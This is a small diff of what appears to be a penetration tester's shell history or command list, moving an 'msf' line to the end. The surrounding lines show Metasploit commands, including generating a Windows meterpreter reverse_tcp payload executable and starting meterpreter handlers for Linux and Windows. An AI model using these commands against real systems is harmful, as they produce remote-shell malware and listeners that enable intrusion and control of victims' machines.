@@ -1,4 +1,3 @@
-msf
 msf -q
 msf -r /workspace/exploit.rc
 msfv -p windows/meterpreter/reverse_tcp LHOST="$(fzf-ip)" LPORT="$(fzf-lport)" -f exe -o /workspace/payload.exe
@@ -48,3 +47,4 @@ msfconsole -q
 msfconsole -r handler.rc
 meterpreter_handler_linux "$(fzf-ip)" "$(fzf-lport)"
 meterpreter_handler_windows "$(fzf-ip)" "$(fzf-lport)"
+msf
